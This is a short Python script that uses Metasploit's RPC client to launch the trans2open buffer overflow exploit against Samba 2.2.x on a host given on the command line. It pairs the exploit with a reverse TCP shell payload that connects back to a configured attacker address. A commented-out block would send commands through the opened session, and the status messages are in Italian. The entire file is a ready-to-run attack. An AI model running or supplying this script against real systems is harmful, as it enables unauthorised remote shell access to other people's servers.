#!/usr/bin/python3

"""
This exploits the buffer overflow found in Samba versions 2.2.0 
to 2.2.8. This particular module is capable of exploiting the flaw 
on x86 Linux systems that do not have the noexec stack option set. 
NOTE: Some older versions of RedHat do not seem to be vulnerable 
since they apparently do not allow anonymous access to IPC.
"""

from pymetasploit3.msfrpc import MsfRpcClient
import sys
from config import *

client=MsfRpcClient(PWD, port=55552)
exploit = client.modules.use('exploit', 'linux/samba/trans2open')
exploit['RHOSTS']=sys.argv[1]
exploit['RPORT']=139
payload = client.modules.use('payload', 'linux/x86/shell_reverse_tcp')
payload['LHOST']= LHOST
payload['LPORT']= LPORT
var = exploit.execute(payload=payload)
print(var)
if var['job_id']==None:
    print("Exploit fallito")
else:
    print("Exploit riuscito")
    """session = client.sessions.list.keys()
    for s in session:
        shell = client.sessions.session(s)
        shell.write('mail')
        print(shell.read())"""






